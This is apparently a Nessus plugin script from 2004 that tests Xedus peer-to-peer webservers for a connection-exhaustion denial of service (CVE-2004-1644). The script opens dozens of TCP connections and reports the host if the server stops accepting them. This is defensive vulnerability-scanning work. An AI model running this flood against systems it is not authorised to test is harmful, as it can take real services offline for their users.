#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# based on Michel Arboi work
#
# Ref: James Bercegay of the GulfTech Security Research Team
# This script is released under the GNU GPLv2

if(description)
{
  script_id(14646);
  script_cve_id("CVE-2004-1644");
  script_bugtraq_id(11071);
  script_version("$Revision: 1.8 $");
  script_name(english:"Xedus Denial of Service");

 
 desc["english"] = "
The remote host runs Xedus Peer to Peer webserver.  This version is vulnerable 
to a denial of service.

An attacker could stop the webserver accepting requests from users by 
establishing multiple connections from the same host.

Solution: Upgrade to the latest version.
Risk factor : Low";
  script_description(english:desc["english"]);

  script_summary(english:"Checks for denial of service in Xedus");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
  script_dependencies("xedus_detect.nasl");
  script_family(english:"Peer-To-Peer File Sharing");
  script_require_ports("Services/www", 4274);
  exit(0);
}

include("http_func.inc");

if ( safe_checks() ) exit(0);

port = get_http_port(default:4274);
if ( ! get_kb_item("xedus/" + port + "/running")) exit(0);

if(get_port_state(port))
{ 
  soc = open_sock_tcp(port);
  if (! soc) return(0);
  
  s[0] = soc;

  for (i = 1; i < 50; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_hole(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    sleep(1);
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
